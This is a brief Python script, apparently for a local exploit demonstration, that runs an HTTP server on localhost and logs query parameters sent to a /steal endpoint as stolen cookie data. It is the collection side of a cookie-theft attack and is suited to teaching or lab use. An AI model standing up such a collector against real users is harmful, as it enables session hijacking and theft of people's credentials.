#!/usr/bin/env python3
# Simple local server to receive stolen cookie data for the exploit demo.
# Run: python attacker_server.py  (listens on http://127.0.0.1:9000/steal)

from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs
import datetime

HOST, PORT = "127.0.0.1", 9000

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urlparse(self.path)
        if parsed.path == "/steal":
            qs = parse_qs(parsed.query)
            ts = datetime.datetime.now().strftime("%H:%M:%S")
            print(f"[{ts}] Stolen data received:")
            for key, val in qs.items():
                print(f"    {key} = {val[0]}")
            print("-" * 40)

        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"ok")

    def log_message(self, format, *args):
        pass

if __name__ == "__main__":
    print(f"Listening on http://{HOST}:{PORT}/steal")
    HTTPServer((HOST, PORT), Handler).serve_forever()